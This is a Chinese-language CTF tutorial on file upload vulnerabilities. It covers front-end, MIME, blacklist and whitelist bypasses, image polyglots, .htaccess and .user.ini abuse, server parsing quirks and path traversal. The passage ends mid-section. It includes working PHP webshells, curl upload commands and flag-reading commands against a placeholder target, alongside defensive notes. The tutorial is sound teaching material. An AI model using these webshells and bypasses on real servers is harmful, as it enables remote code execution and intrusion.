# 1. 文件上传

文件上传漏洞不是"能传文件"就是漏洞，而是服务器对上传的文件名、类型、内容校验不严，导致你传的脚本被解析执行。

文件上传漏洞的核心不是"网站允许上传文件"，而是服务器接收文件后，对文件名、文件内容、保存路径、访问方式或解析方式处理不当，使攻击者上传的内容能够被服务器解析、被浏览器执行、覆盖已有文件，或者和其他漏洞组合利用。

做文件上传题时，不要一开始就把所有后缀逐个尝试。更有效的方法是先判断：

1. 检测发生在前端还是后端。
2. 后端检查的是文件名、`Content-Type`、文件头、真实图片内容，还是多个条件一起检查。
3. 文件保存后是否位于 Web 可访问目录。
4. 上传目录是否会解析脚本。
5. 服务端是否重命名文件。
6. 上传后的文件能否与文件包含、路径穿越、反序列化、XSS 等漏洞组合。
## 1.1 文件上传基础

### 1.1.1 什么是文件上传漏洞

正常的文件上传功能会允许用户上传头像、附件、压缩包、文档或媒体文件。

例如用户上传一张头像：

```text
avatar.jpg
```

服务器可能会进行以下处理：

1. 接收上传请求。
2. 把文件暂时保存到临时目录。
3. 检查文件名、后缀、MIME 类型、文件头和文件大小。
4. 生成新的随机文件名。
5. 把文件移动到最终存储目录。
6. 把文件访问地址返回给用户。

如果某一步校验不严格，攻击者就可能上传服务器能够执行的脚本文件，或者上传能够触发其他漏洞的特殊文件。

例如上传：

```php
<?php system($_GET['cmd']); ?>
```

如果服务器把它保存为 `shell.php`，并且上传目录允许 PHP 解析，那么访问：

```text
/uploads/shell.php?cmd=id
```

服务器就可能执行 `id` 命令。

### 1.1.2 文件上传的正常处理流程

PHP 接收文件上传时，文件通常先进入系统临时目录。

一个简化的上传流程如下：

```text
浏览器选择文件
    ↓
发送 multipart/form-data 请求
    ↓
Web 服务器接收请求
    ↓
PHP 把文件保存为临时文件
    ↓
后端读取 $_FILES
    ↓
检查文件名、大小、类型和内容
    ↓
move_uploaded_file() 移动到最终目录
    ↓
数据库记录文件路径
    ↓
用户访问或下载文件
```

PHP 中常见的上传信息：

```php
$_FILES['file']['name']      // 客户端提供的原始文件名
$_FILES['file']['type']      // 客户端提供的 Content-Type，不可信
$_FILES['file']['tmp_name']  // PHP 创建的临时文件路径
$_FILES['file']['error']     // 上传错误码
$_FILES['file']['size']      // 文件大小
```

其中 `name` 和 `type` 都来自客户端，可以在 BurpSuite 中修改，不能单独作为安全判断依据。

### 1.1.3 漏洞能够成功利用的条件

上传一个 PHP 文件不等于已经成功利用。

想通过文件上传直接获得代码执行，通常需要同时满足：

1. 能够上传攻击者控制的文件内容。
2. 文件最终保存在服务器上。
3. 能够知道或猜到文件保存路径。
4. 文件位于 Web 可以访问的位置，或者能被其他漏洞读取、包含。
5. 文件后缀或服务器配置能够让它被脚本引擎解析。
6. Web 进程具有执行对应代码或命令的权限。

可以把文件上传到 RCE 的利用链理解为：

```text
上传成功
    ↓
找到文件路径
    ↓
文件可访问
    ↓
文件被当成脚本解析
    ↓
代码执行
```

其中任意一步不成立，都可能只能得到"文件存储"，不能直接得到 RCE。

### 1.1.4 文件上传的常见危害

文件上传漏洞不只有上传 Webshell 一种危害。

| 危害 | 典型场景 |
| ---- | -------- |
| 远程代码执行 | 上传 PHP、JSP、ASP.NET 等脚本并被服务器解析 |
| 存储型 XSS | 上传 SVG、HTML，之后由管理员或 Bot 打开 |
| XXE | 上传 XML、SVG、Office 文档后被后端 XML 解析器处理 |
| 任意文件覆盖 | 文件名或保存路径可控，覆盖配置、源码或静态资源 |
| 路径穿越写文件 | 文件名中包含 `../`，写到上传目录之外 |
| Zip Slip | 上传压缩包，解压时通过 `../` 写到任意目录 |
| 拒绝服务 | 上传超大文件、压缩炸弹、超大尺寸图片 |
| 信息泄露 | 上传后错误信息暴露真实路径、框架或存储配置 |
| 组合利用 | 上传图片马后配合文件包含、解析差异或反序列化 |

### 1.1.5 常见文件上传入口

CTF 中常见的上传入口包括：

1. 用户头像。
2. 文章封面和相册。
3. 文件附件。
4. Markdown 或富文本编辑器。
5. 简历、PDF、Office 文档。
6. 主题、插件和模板安装。
7. 压缩包导入和备份恢复。
8. 数据集、模型或配置文件导入。
9. SVG、XML、图片处理接口。
10. 管理后台批量导入功能。

有些页面没有明显的上传按钮，但是 JavaScript 中可能存在隐藏接口，例如：

```javascript
fetch('/api/upload', {
    method: 'POST',
    body: formData
});
```

所以还要检查前端源码、网络请求和 API 文档。

### 1.1.6 multipart/form-data 请求结构

浏览器上传文件时，最常见的请求格式是 `multipart/form-data`。

一个简化的原始请求：

```http
POST /upload.php HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----WebKitBoundary123
Cookie: PHPSESSID=abcdef

------WebKitBoundary123
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

【文件内容】
------WebKitBoundary123
Content-Disposition: form-data; name="submit"

upload
------WebKitBoundary123--
```

需要重点观察的位置：

| 位置 | 示例 | 是否通常可控 |
| ---- | ---- | ------------ |
| 表单字段名 | `name="file"` | 可以修改，但要和后端字段对应 |
| 文件名 | `filename="avatar.jpg"` | 可以修改 |
| 文件 MIME | `Content-Type: image/jpeg` | 可以修改 |
| 文件内容 | `【文件内容】` | 可以修改 |
| 其他参数 | `submit=upload` | 可以修改 |
| Cookie / Token | `PHPSESSID`、CSRF Token | 可能是上传所必需 |

请求头最外层的 `Content-Type` 带有 boundary，文件块内部还有一个 `Content-Type`。绕过文件类型检查时，通常修改的是文件块内部的类型。

### 1.1.7 文件上传的第一轮判断

抓到正常上传请求后，可以先回答下面这些问题：

1. 删除前端 JavaScript 后，请求能不能正常发出。
2. 把 `filename` 改成 `test.php` 后，响应发生什么变化。
3. 只修改内部 `Content-Type` 是否就能通过。
4. 文件头不变、内容改变时，是否还能上传。
5. 后端会不会重新生成文件名。
6. 响应中有没有返回 `url`、`path`、`filename`、`id`。
7. 上传后是直接访问文件，还是通过下载接口读取。
8. 访问时响应头是 `inline` 还是 `attachment`。
9. 文件内容是否被压缩、裁剪、转码或重新编码。
10. 上传目录是否允许脚本解析。

先确定检查层次，再选择对应绕过方式。

## 1.2 Webshell 与安全探测文件

### 1.2.1 先使用最小化探测文件

测试文件是否会被服务器解析时，不建议第一步就上传复杂的一句话木马。

可以先使用只输出固定内容的 PHP 文件：

```php
<?php echo "UPLOAD_TEST_7f3a"; ?>
```

如果访问后页面只显示：

```text
UPLOAD_TEST_7f3a
```

说明文件很可能被 PHP 解析。

如果页面直接下载文件，或者显示完整的 `<?php ... ?>` 源码，说明这个位置没有按照 PHP 解析。

也可以使用：

```php
<?php phpinfo(); ?>
```

但 `phpinfo()` 会输出大量服务器信息。CTF 中可以用来判断环境，真实授权测试中应尽量减少不必要的信息暴露。

### 1.2.2 PHP 常见 Webshell

最简单的 GET 命令执行：

```php
<?php system($_GET['cmd']); ?>
```

访问方式：

```text
/uploads/shell.php?cmd=id
/uploads/shell.php?cmd=whoami
/uploads/shell.php?cmd=cat%20/flag
```

POST 参数代码执行：

```php
<?php @eval($_POST['cmd']); ?>
```

这里的 `eval()` 执行的是 PHP 代码，不是系统命令。

例如 POST Body：

```text
cmd=phpinfo();
```

如果想通过它执行系统命令，需要传入 PHP 代码：

```text
cmd=system('id');
```

为了避免混淆，做题时要先分清楚：

| 函数 | 参数内容 |
| ---- | -------- |
| `system()` | 系统命令，例如 `id`、`cat /flag` |
| `exec()` | 系统命令，但通常需要额外输出返回数组 |
| `shell_exec()` | 系统命令，返回完整字符串 |
| `eval()` | PHP 代码，例如 `system('id');` |

### 1.2.3 其他脚本环境

不同服务器使用的脚本后缀不同。

| 环境 | 常见后缀 |
| ---- | -------- |
| PHP | `.php`、`.phtml`、`.php3`、`.php5`，是否解析取决于配置 |
| Classic ASP | `.asp`、`.asa` |
| ASP.NET | `.aspx`、`.ashx` |
| Java | `.jsp`、`.jspx` |
| CGI | `.cgi`、`.pl`、`.py`，需要 CGI 配置和执行权限 |

不能因为某个后缀"理论上属于脚本"就认为目标一定会解析。最终要看 Web 服务器、中间件和目录配置。

### 1.2.4 上传成功后的基础命令

获得命令执行后，可以先确认身份和目录：

```bash
id
whoami
pwd
ls -la
```

再查找 CTF 中常见的 flag：

```bash
ls -la /
cat /flag
cat /flag.txt
find / -maxdepth 3 -iname '*flag*' 2>/dev/null
printenv
```

如果目标是 Windows：

```powershell
whoami
cd
dir
type C:\flag.txt
Get-ChildItem C:\ -Filter *flag* -Recurse -ErrorAction SilentlyContinue
```

### 1.2.5 常见注意点

1. 上传成功不等于脚本已经解析。
2. HTTP 200 不代表命令执行成功，可能只是返回上传成功页面。
3. `eval()` 接收 PHP 代码，`system()` 接收系统命令。
4. 参数名要与 Webshell 中的参数名一致。
5. 如果 URL 中命令包含空格、`&`、`#` 等字符，需要 URL 编码。
6. 先用固定字符串验证解析，再尝试读取 flag。
7. 如果上传目录禁止执行，可以继续寻找文件包含、配置文件上传或路径穿越写文件。

## 1.3 判断服务器检查了什么

### 1.3.1 判断是前端检查还是后端检查

前端检查常见特征：

1. 选择文件后立刻弹窗。
2. 浏览器没有发送上传请求。
3. JavaScript 中存在 `endsWith()`、`split('.')`、正则后缀判断。
4. 删除 `accept` 属性或禁用 JavaScript 后就能选择其他文件。

例如：

```html
<input type="file" name="file" accept=".jpg,.png,.gif">
```

`accept` 只影响浏览器文件选择界面，不是安全措施。

后端检查的特征是：

1. 请求已经发送到服务器。
2. 响应返回"不允许的文件类型"。
3. 修改请求后仍然被拒绝。
4. 服务端源码中存在后缀、MIME、文件头或图片解码判断。

### 1.3.2 判断检查的是文件名还是 Content-Type

准备同一份文件内容，依次只修改一个位置。

第一组：

```text
filename="test.php"
Content-Type: image/jpeg
```

第二组：

```text
filename="test.jpg"
Content-Type: application/x-php
```

判断方法：

| 结果 | 可能的检查 |
| ---- | ---------- |
| 第一组通过，第二组失败 | 可能主要检查 `Content-Type` |
| 第一组失败，第二组通过 | 可能主要检查文件后缀 |
| 两组都失败 | 可能同时检查后缀和 MIME，或者检查文件内容 |
| 两组都通过 | 检查可能只在前端，或后端没有有效检查 |

一次只改一个变量，才能知道到底是哪一个条件生效。

### 1.3.3 判断是否检查文件头或真实图片

可以准备下面几组文件：

1. 正常 JPG 图片。
2. 后缀为 `.jpg`，内容只是普通文本。
3. 内容开头为 `GIF89a`，后面跟 PHP 代码。
4. 真实图片末尾追加 PHP 代码。
5. 能被图片库正常解码的真实图片。

如果普通文本失败，但 `GIF89a` 文件通过，可能只检查文件头。

如果 `GIF89a` 也失败，但真实图片追加代码可以通过，可能调用了 `getimagesize()`、`exif_imagetype()` 或图片解码库。

如果上传后追加的 PHP 代码消失，图片尺寸、哈希或文件大小发生明显变化，说明后端可能重新编码了图片。

### 1.3.4 判断文件是否被重命名或重新处理

上传前记录：

```bash
sha256sum avatar.jpg
file avatar.jpg
identify avatar.jpg
```

下载服务器保存后的文件，再比较：

```bash
sha256sum downloaded.jpg
file downloaded.jpg
identify downloaded.jpg
```

如果哈希变化，不一定代表有安全处理，也可能只是元数据被修改。

如果文件末尾追加的数据消失，通常说明后端做了重新编码或重写。

### 1.3.5 推荐的对比测试顺序

可以按照下面顺序测试：

1. 正常图片 + 正常后缀 + 正常 MIME。
2. 相同内容，只改后缀。
3. 相同内容，只改 MIME。
4. 相同后缀和 MIME，只改文件内容。
5. 保留真实图片，末尾追加探测代码。
6. 修改文件名大小写、双后缀和特殊后缀。
7. 观察响应和最终保存文件。

这和 SQL 注入中成对测试永真、永假条件一样，核心是控制变量。

## 1.4 前端 JavaScript 检查绕过

### 1.4.1 典型场景

前端可能写成：

```javascript
const file = document.querySelector('#file').files[0];
const ext = file.name.split('.').pop().toLowerCase();

if (!['jpg', 'png', 'gif'].includes(ext)) {
    alert('只允许上传图片');
    return false;
}
```

这段代码运行在攻击者自己的浏览器里，可以被修改、删除或绕过。

### 1.4.2 使用 BurpSuite 修改文件名

最常用的方法：

1. 把文件在本地命名为 `shell.jpg`。
2. 让前端校验正常通过。
3. 使用 BurpSuite 抓住上传请求。
4. 在 Repeater 中把：

   ```http
   filename="shell.jpg"
   ```

   修改为：

   ```http
   filename="shell.php"
   ```

5. 保持文件内容不变，发送请求。
6. 根据响应判断后端是否还有检查。

### 1.4.3 禁用或修改前端代码

也可以：

1. 在开发者工具中删除 `onsubmit`、`onchange` 事件。
2. 删除 `accept=".jpg,.png"`。
3. 在 Sources 中设置断点并修改变量。
4. 直接使用 BurpSuite、curl 或 Python 构造请求，不经过页面。

curl 示例：

```bash
curl -i -b "PHPSESSID=【Session】" \
  -F "file=@shell.php;filename=shell.php;type=application/x-php" \
  -F "submit=upload" \
  http://target.example/upload.php
```

### 1.4.4 常见注意点

1. 前端验证可以绕过，但后端可能还有验证。
2. 删除 `accept` 只能让浏览器选择文件，不会自动绕过后端。
3. 如果上传请求带 CSRF Token，要保留或更新 Token。
4. 如果接口只允许特定字段名，要保持 `name="file"` 与后端一致。
5. 绕过前端后，要继续判断文件是否真的保存和解析。

## 1.5 Content-Type 检查绕过

### 1.5.1 漏洞原理

不安全的后端可能直接信任：

```php
$_FILES['file']['type']
```

例如：

```php
if ($_FILES['file']['type'] !== 'image/jpeg') {
    die('只允许 JPG');
}
```

但是这个值来自 multipart 文件块中的请求头，攻击者可以修改。

### 1.5.2 修改文件块的 Content-Type

原始请求：

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php
```

修改为：

```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

文件内容仍然可以是：

```php
<?php echo "UPLOAD_TEST"; ?>
```

如果后端只检查客户端提交的 MIME，就可能通过。

### 1.5.3 常见 MIME 类型

| 文件 | 常见 MIME |
| ---- | --------- |
| JPG | `image/jpeg` |
| PNG | `image/png` |
| GIF | `image/gif` |
| SVG | `image/svg+xml` |
| PDF | `application/pdf` |
| ZIP | `application/zip` |
| 普通二进制 | `application/octet-stream` |
| PHP | 常见为 `application/x-php` 或 `text/x-php`，但并不统一 |

MIME 类型不是由文件后缀唯一决定的，不同客户端可能发送不同值。

### 1.5.4 常见注意点

1. 修改的是文件块内部的 `Content-Type`，不要误改最外层带 boundary 的请求头。
2. `$_FILES['file']['type']` 不可信。
3. 服务端使用 `finfo_file()` 检测出的 MIME 更可信，但仍不能单独决定文件是否安全。
4. 即使 MIME 绕过成功，后缀、文件头和解析规则仍可能阻止利用。

## 1.6 黑名单后缀绕过

黑名单会列出不允许上传的危险后缀。

例如：

```php
$deny = ['php', 'phtml', 'php3', 'php5'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (in_array($ext, $deny, true)) {
    die('禁止上传');
}
```

黑名单的问题是容易遗漏后缀、大小写、规范化差异和服务器特有解析方式。

### 1.6.1 寻找遗漏后缀

先根据技术栈判断服务器可能解析哪些后缀。

PHP 环境可以测试：

```text
.php
.phtml
.php3
.php4
.php5
.phar
```

这些后缀并不是在所有服务器上都会执行。是否有效取决于 Apache、Nginx、PHP-FPM 和站点配置。

`.phps` 在部分 Apache / PHP 配置中用于显示 PHP 源码，而不是执行代码。它更可能造成源码泄露，不能默认当成 Webshell 后缀。

最可靠的判断方法是上传固定字符串探测文件，再访问验证。

### 1.6.2 大小写绕过

如果后端只拦截小写 `.php`，但没有统一转换大小写，可以尝试：

```text
shell.PHP
shell.Php
shell.pHp
```

成功前提：

1. 过滤器区分大小写。
2. 文件系统和 Web 服务器最终仍把该后缀交给 PHP 处理。

Linux 文件名区分大小写，但后缀处理是否区分大小写取决于服务器配置。Windows 文件系统通常不区分大小写。

### 1.6.3 双后缀和多后缀

常见写法：

```text
shell.php.jpg
shell.jpg.php
shell.php.png
```

可能出现两类错误：

1. 后端只检查最后一个后缀，但服务器根据前面的后缀选择处理器。
2. 后端检查第一个后缀，服务器解析最后一个后缀。

现代默认配置中，`shell.php.jpg` 通常不会自动作为 PHP 执行。只有存在特定多后缀映射或错误配置时才有效。

### 1.6.4 双写后缀

如果后端只执行一次字符串替换：

```php
$name = str_ireplace('.php', '', $name);
```

可以尝试：

```text
shell.pphphp
```

删除中间的 `.php` 或 `php` 后，剩余内容可能重新组成 `shell.php`。

双写只适合"命中后删除一次"的过滤器。如果后端循环过滤、提取最终后缀或使用白名单，通常无效。

### 1.6.5 Windows 尾部点号和空格

某些 Windows 文件处理链会在保存时规范化文件名，去掉尾部点号或空格。

可以在 CTF 中尝试：

```text
shell.php.
shell.php. .
shell.php 
```

可能出现：

```text
过滤器看到：shell.php.
文件系统保存：shell.php
```

适用条件：

1. 目标运行在 Windows。
2. 应用层和文件系统对文件名的规范化顺序不一致。
3. 框架没有提前去掉点号和空格。

这不是 Linux 通用技巧。

### 1.6.6 NTFS 备用数据流

Windows NTFS 支持 Alternate Data Streams，旧题中常见：

```text
shell.php::$DATA
```

如果过滤器没有处理 `::$DATA`，而保存流程最终生成或影响 `shell.php`，可能绕过黑名单。

这类技巧高度依赖 Windows、PHP 版本、文件 API 和 Web 服务器行为。现代环境中不能默认有效。

### 1.6.7 %00 截断

历史 PHP 或底层 C 扩展在处理空字节时，可能把 `%00` 当成字符串结束位置。

例如：

```text
save_path=/uploads/shell.php%00
filename=avatar.jpg
```

后端拼接后可能看到：

```text
/uploads/shell.php%00avatar.jpg
```

而底层文件 API 只使用：

```text
/uploads/shell.php
```

重要适用条件：

1. 主要影响 PHP 5.3.4 之前的旧环境，或存在类似空字节问题的底层扩展。
2. 需要 URL 解码后产生真正的空字节。
3. 现代 PHP 不能默认使用这个技巧。

### 1.6.8 文件名长度截断

有些后端先检查完整文件名的最后一个后缀，再把文件名截断到固定长度。

例如伪代码：

```php
if (!str_ends_with($name, '.jpg')) {
    die('只允许 JPG');
}

$name = substr($name, 0, 50);
```

如果构造的文件名在检查时以 `.jpg` 结尾，但前 50 个字符正好以 `.php` 结尾：

```text
【46 个 A】.php.jpg
```

检查时看到：

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.jpg
```

截断后可能保存为：

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
```

计算方法：

```text
如果截断长度是 N：
填充字符数量 = N - len(".php")
文件名 = "A" * 填充字符数量 + ".php" + ".jpg"
```

利用条件：

1. 后缀检查发生在截断之前。
2. 截断按字节或字符执行，并且长度可以准确控制。
3. 截断后不会再次检查后缀。
4. 最终目录允许 PHP 解析。
5. 文件内容能够通过图片或其他内容检查。

如果文件名中含有多字节 Unicode 字符，还要区分后端按字节截断还是按字符截断。

### 1.6.9 黑名单绕过的推荐顺序

1. 查看源码或错误信息，确定黑名单内容。
2. 判断服务器和脚本环境。
3. 测试遗漏后缀。
4. 测试大小写。
5. 测试双后缀和双写。
6. 检查是否存在先校验、后截断的文件名处理。
7. 只有在 Windows 环境再测试尾部点号、空格和 NTFS 特性。
8. 只有确认旧版本再测试 `%00`。
9. 每次上传后都检查服务器最终保存的文件名。

### 1.6.10 常见注意点

1. 不要把所有后缀一次性丢给 Intruder，却不分析响应差异。
2. 后缀通过不代表文件会被解析。
3. PHP 后缀能否执行由服务器配置决定。
4. Windows 技巧不要套到 Linux。
5. `%00` 是历史技巧，必须标注版本前提。
6. 文件名截断必须确认校验和截断的先后顺序。
7. 如果黑名单非常完整，优先寻找配置文件上传、路径控制、文件包含或内容解析问题。

## 1.7 白名单、文件头和图片内容检查绕过

### 1.7.1 白名单检查

白名单只允许明确的安全后缀：

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allowed, true)) {
    die('文件类型不允许');
}
```

白名单通常比黑名单安全。绕过方向不再是寻找遗漏脚本后缀，而是继续检查：

1. 保存路径是否可控。
2. 是否能上传配置文件。
3. 图片文件能否被文件包含。
4. Web 服务器是否存在路径解析差异。
5. 是否只检查文件头。
6. 上传后是否会被重新编码。
7. 是否能利用 SVG、HTML、XML 等被允许格式触发其他漏洞。

### 1.7.2 文件头检查

常见文件头：

| 类型 | 常见十六进制开头 | 文本表示 |
| ---- | ---------------- | -------- |
| GIF | `47 49 46 38 37 61` 或 `47 49 46 38 39 61` | `GIF87a` / `GIF89a` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | 二进制 |
| JPG | `FF D8 FF` | 二进制 |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK` |

如果后端只检查开头几个字节，可以构造：

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

如果文件之后被当作 PHP 解析，`GIF89a` 会作为普通文本输出，PHP 标签内的代码仍可能执行。

### 1.7.3 使用真实图片构造图片马

只伪造几个文件头字节不一定能通过 `getimagesize()` 或图片解码库。

更稳定的方法是使用真实图片，再在末尾追加 PHP 代码。

Linux：

```bash
printf '%s' '<?php system($_GET["cmd"]); ?>' > shell.php
cat cover.jpg shell.php > avatar.jpg
```

Windows CMD：

```bat
copy /b cover.jpg+shell.php avatar.jpg
```

检查：

```bash
file avatar.jpg
strings avatar.jpg | tail
```

这种文件仍可能被识别为图片，同时末尾包含 PHP 代码。

但是只有在以下情况之一成立时，代码才会执行：

1. 最终文件被保存为 PHP 后缀。
2. 上传目录配置把图片后缀交给 PHP。
3. 文件被 PHP 文件包含。
4. 存在其他把文件内容送入解释器的漏洞。

图片马本身不会因为被浏览器打开就自动执行 PHP。

### 1.7.4 getimagesize() 和 exif_imagetype()

后端可能使用：

```php
if (getimagesize($_FILES['file']['tmp_name']) === false) {
    die('不是图片');
}
```

或者：

```php
$type = exif_imagetype($_FILES['file']['tmp_name']);

if (!in_array($type, [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF], true)) {
    die('不是图片');
}
```

这类检查会比只看文件头更严格，但它们主要判断文件是否像图片，并不能保证文件中不存在追加数据。

可以使用真实图片追加内容进行测试。

### 1.7.5 图片重新编码

更安全的后端会真正解码图片，再生成一张新图片：

```php
$data = file_get_contents($_FILES['file']['tmp_name']);
$img = @imagecreatefromstring($data);

if ($img === false) {
    die('无效图片');
}

imagepng($img, '/safe/path/new-image.png');
```

重新编码通常会丢弃原文件末尾追加的 PHP 代码和大部分元数据。

判断是否重新编码：

1. 对比上传前后的文件哈希。
2. 对比文件大小。
3. 查看末尾追加字符串是否消失。
4. 查看图片格式是否统一变成 PNG 或 JPG。
5. 查看 EXIF 元数据是否被移除。

如果后端已经正确重新编码，就不要继续机械尝试 `GIF89a`。应寻找路径、配置、解析器、图片库漏洞或其他功能点。

### 1.7.6 关键字内容过滤

后端可能搜索：

```text
<?php
eval
system
exec
shell_exec
passthru
```

这种黑名单仍可能存在编码、短标签、字符串拼接或其他函数绕过，但要先判断文件最终会如何进入解释器。

常见探测方式：

```php
<?= "UPLOAD_TEST"; ?>
```

适用条件是 PHP 开启并支持短输出标签。`<?=` 在现代 PHP 中通常可用，但是否能执行仍取决于文件被 PHP 解析。

如果只是为了读取 flag，也可以考虑不依赖 Shell 的 PHP 文件读取函数：

```php
<?= file_get_contents('/flag'); ?>
```

### 1.7.7 常见注意点

1. 文件头正确不代表图片结构完整。
2. 能通过 `getimagesize()` 不代表能通过重新编码。
3. 图片马只有进入脚本解释器才会执行。
4. 上传后要重新下载并检查文件是否被修改。
5. SVG 是文本 XML，不应与普通 JPG、PNG 使用完全相同的安全策略。
6. 白名单环境优先寻找利用链，不要只尝试更多危险后缀。

## 1.8 配置文件上传利用

### 1.8.1 .htaccess 利用

Apache 在允许目录级配置时，会读取 `.htaccess`。

如果上传功能允许上传 `.htaccess`，可以在 CTF 环境中尝试让特定图片按 PHP 解析：

```apache
<FilesMatch "^avatar\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

然后上传同目录文件：

```php
avatar.jpg 内容：
<?php system($_GET['cmd']); ?>
```

访问：

```text
/uploads/avatar.jpg?cmd=id
```

成功需要满足：

1. Web 服务器是 Apache。
2. 站点允许 `.htaccess` 生效，例如对应目录至少允许 `AllowOverride FileInfo`，或者通过 `AllowOverrideList` 单独允许 `SetHandler`。
3. PHP 处理器可以通过 `SetHandler` 调用。
4. `.htaccess` 和目标文件位于有效作用目录。
5. 上传后文件名没有被随机重命名，或者规则能匹配新文件名。

如果服务器返回 500，可能是指令不允许、语法错误或对应处理器不存在。

### 1.8.2 .user.ini 利用

PHP 在 CGI 或 FastCGI 模式下，可能读取目录中的 `.user.ini`。

常见内容：

```ini
auto_prepend_file=avatar.jpg
```

再上传：

```php
avatar.jpg 内容：
<?php system($_GET['cmd']); ?>
```

当访问同目录下一个正常 PHP 文件时，PHP 可能先包含 `avatar.jpg`。

利用条件：

1. PHP 运行在 CGI 或 FastCGI 模式，常见于 PHP-FPM。
2. `user_ini.filename` 没有被禁用，默认通常是 `.user.ini`。
3. `.user.ini` 位于 PHP 会扫描的目录。
4. 同目录或下级目录存在可访问的 PHP 文件。
5. `auto_prepend_file` 指向的文件可读。
6. 配置缓存可能导致修改后需要等待一段时间，`user_ini.cache_ttl` 默认值为 300 秒。

`.user.ini` 不等于 Apache 的 `.htaccess`，在 Apache mod_php 模式下通常不会按相同方式生效。

### 1.8.3 web.config 利用

IIS / ASP.NET 环境可能使用 `web.config` 控制目录配置。

如果上传目录允许覆盖或新增 `web.config`，并且服务器允许对应处理器映射，就可能改变文件解析方式。

这类利用高度依赖：

1. IIS 和 ASP.NET 版本。
2. 站点锁定的配置节。
3. 应用程序池权限。
4. 上传目录是否属于应用目录。
5. 目标服务器允许的 Handler。

因此做题时优先读取源码或服务器报错，不要直接套用其他环境的 `web.config`。

### 1.8.4 配置文件利用速查

| 文件 | 常见环境 | 作用 |
| ---- | -------- | ---- |
| `.htaccess` | Apache | 修改目录级解析和访问规则 |
| `.user.ini` | PHP CGI / FastCGI | 修改目录级 PHP 配置 |
| `web.config` | IIS / ASP.NET | 修改应用或目录配置 |

配置文件利用的核心是"先上传配置，再上传普通后缀文件"，属于两阶段利用。

## 1.9 Web 服务器解析差异

### 1.9.1 Apache 多后缀解析

部分 Apache 配置会根据多个后缀匹配处理器。

例如：

```text
shell.php.jpg
```

如果 `.php` 被识别为 PHP Handler，而 `.jpg` 只被识别为内容类型，文件可能被 PHP 处理。

但在很多现代配置中，最后的 `.jpg` 会让它只作为静态图片返回。

判断方法：

1. 上传固定字符串探测文件。
2. 分别测试 `test.php`、`test.php.jpg`、`test.jpg.php`。
3. 观察响应是执行结果、源码、下载还是图片。
4. 结合 Apache 配置或题目源码判断。

### 1.9.2 Nginx 与 PATH_INFO

旧式或错误的 Nginx + PHP-FPM 配置可能把：

```text
/uploads/avatar.jpg/1.php
```

交给 PHP-FPM，并把前半部分图片文件当成脚本。

这通常与 `fastcgi_split_path_info`、`SCRIPT_FILENAME` 拼接和 PHP 的路径处理有关。

现代安全配置中，Nginx 会先确认真实脚本文件存在，只允许 `.php` 文件进入 PHP-FPM，此时该技巧无效。

常见安全思路是在 PHP location 中使用类似：

```nginx
try_files $uri =404;
```

先确认请求对应的脚本文件真实存在，再交给 FastCGI。

测试时要比较：

```text
/uploads/avatar.jpg
/uploads/avatar.jpg/test.php
/uploads/avatar.jpg/.php
```

如果后两者返回 PHP 执行结果，才说明存在解析差异。

### 1.9.3 IIS 历史解析特性

旧版 IIS 题目中可能出现：

```text
shell.asp;.jpg
shell.asp/1.jpg
folder.asp/file.jpg
```

这些写法主要与旧版 IIS、ASP 映射和目录解析特性有关。

现代 IIS / ASP.NET 默认环境不能直接假设这些技巧仍然有效，必须结合版本和题目配置。

### 1.9.4 常见解析差异对照

| 技巧 | 主要环境 | 关键前提 |
| ---- | -------- | -------- |
| `shell.php.jpg` | 特定 Apache 配置 | 多后缀中 `.php` 仍绑定处理器 |
| `image.jpg/test.php` | 错误 Nginx + PHP-FPM 配置 | PATH_INFO 被错误交给 PHP |
| `shell.asp;.jpg` | 旧 IIS | 历史解析特性 |
| 尾部点号 / 空格 | Windows | 应用和文件系统规范化不一致 |
| `::$DATA` | Windows NTFS | 旧处理链没有正确规范化 |

### 1.9.5 常见注意点

1. 解析差异是配置相关问题，不是看到某个服务器名字就一定存在。
2. 先用固定输出探测，避免把普通静态回显误判为代码执行。
3. 记录状态码、响应头、响应长度和响应体。
4. 如果服务器直接下载文件，查看 `Content-Disposition` 和 `Content-Type`。
5. 版本不明确时，不要把历史技巧写成通用结论。

## 1.10 文件名和保存路径可控

### 1.10.1 文件名路径穿越

不安全代码可能直接拼接客户端文件名：

```php
$target = __DIR__ . '/uploads/' . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $target);
```

如果没有清理路径，可以尝试：

```text
filename="../shell.php"
filename="../../shell.php"
filename="../../../var/www/html/shell.php"
```

最终可能写到上传目录之外。

不过 PHP、框架、反向代理或 multipart 解析库可能会自动去掉部分路径，所以要根据最终保存路径验证。

### 1.10.2 独立路径参数

有些接口会额外接收：

```http
Content-Disposition: form-data; name="path"

uploads/avatar.jpg
```

或者：

```json
{
  "filename": "avatar.jpg",
  "directory": "images/"
}
```

需要测试：

```text
../
../../
/var/www/html/
C:\inetpub\wwwroot\
```

还要测试 URL 编码：

```text
%2e%2e%2f
..%2f
%2e%2e%5c
```

关键是判断服务端在过滤前后进行了几次解码和路径规范化。

### 1.10.3 任意文件覆盖

如果服务器保留原始文件名，可能覆盖已有文件。

可以检查：

1. 同名上传两次，旧文件是否被替换。
2. 能否覆盖其他用户的头像。
3. 能否覆盖公开 JavaScript、CSS 或模板文件。
4. 能否覆盖配置、缓存或任务文件。
5. 符号链接或挂载目录是否让影响范围扩大。

在 CTF 中，覆盖一个会被加载的 PHP 文件、模板文件或定时任务文件，可能进一步得到代码执行。

### 1.10.4 basename() 不是完整防御

使用：

```php
$name = basename($_FILES['file']['name']);
```

